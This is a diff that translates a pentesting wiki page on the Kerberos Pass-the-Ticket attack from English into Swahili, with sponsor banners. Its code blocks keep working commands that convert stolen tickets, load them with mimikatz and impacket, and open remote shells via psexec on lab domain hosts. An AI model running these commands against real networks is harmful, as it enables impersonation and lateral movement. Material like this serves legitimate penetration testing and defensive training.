@@ -5,24 +5,23 @@
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) kujenga na **kujiendesha** kazi kwa urahisi zikiwa na zana za jamii **za kisasa zaidi** duniani.\
+Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
 ## Pass The Ticket (PTT)
 
-In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.
+Katika mbinu ya shambulio ya **Pass The Ticket (PTT)**, washambuliaji **hupora tiketi ya uthibitishaji ya mtumiaji** badala ya nenosiri au thamani za hash. Tiketi hii iliyoporwa inatumika kisha **kufanana na mtumiaji**, ikipata ufikiaji usioidhinishwa kwa rasilimali na huduma ndani ya mtandao.
 
-**Read**:
+**Soma**:
 
-- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
-- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
+- [Kuvuna tiketi kutoka Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+- [Kuvuna tiketi kutoka Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Swaping Linux and Windows tickets between platforms**
+### **Kubadilisha tiketi za Linux na Windows kati ya majukwaa**
 
-The [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) tool converts ticket formats using just the ticket itself and an output file.
-
+Zana ya [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) inabadilisha muundo wa tiketi kwa kutumia tiketi yenyewe tu na faili ya matokeo.
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -30,11 +29,9 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
+Katika Windows [Kekeo](https://github.com/gentilkiwi/kekeo) inaweza kutumika.
 
-In Windows [Kekeo](https://github.com/gentilkiwi/kekeo) can be used.
-
-### Pass The Ticket Attack
-
+### Shambulio la Pass The Ticket
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -47,18 +44,16 @@ mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.k
 klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-
-## References
+## Marejeo
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) kujenga na **kujiendesha** kwa urahisi kazi zinazotolewa na zana za jamii **zilizoendelea zaidi** duniani.\
+Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
